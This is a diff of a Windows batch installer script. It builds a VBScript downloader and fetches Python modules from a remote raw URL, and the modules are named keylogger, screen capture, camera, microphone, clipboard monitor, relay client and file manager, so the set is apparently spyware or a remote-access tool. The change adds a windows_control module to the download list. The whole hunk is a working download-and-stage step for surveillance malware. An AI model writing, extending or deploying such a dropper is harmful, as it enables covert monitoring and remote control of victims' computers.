@@ -23,7 +23,7 @@ echo   st.SaveToFile dest, 2                   >> "%DL%"
 echo   st.Close                                >> "%DL%"
 echo End If                                    >> "%DL%"
 
-for %%F in (app.py keylogger.py screencap.py controller.py server.py recorder.py camera.py clipboard_monitor.py processes.py relay_client.py file_manager.py microphone.py requirements.txt) do (
+for %%F in (app.py keylogger.py screencap.py controller.py server.py recorder.py camera.py clipboard_monitor.py processes.py relay_client.py file_manager.py microphone.py windows_control.py requirements.txt) do (
     cscript //nologo "%DL%" "%RAW%/%%F" "%DIR%\%%F"
 )
 cscript //nologo "%DL%" "%RAW%/templates/viewer.html" "%DIR%\templates\viewer.html"
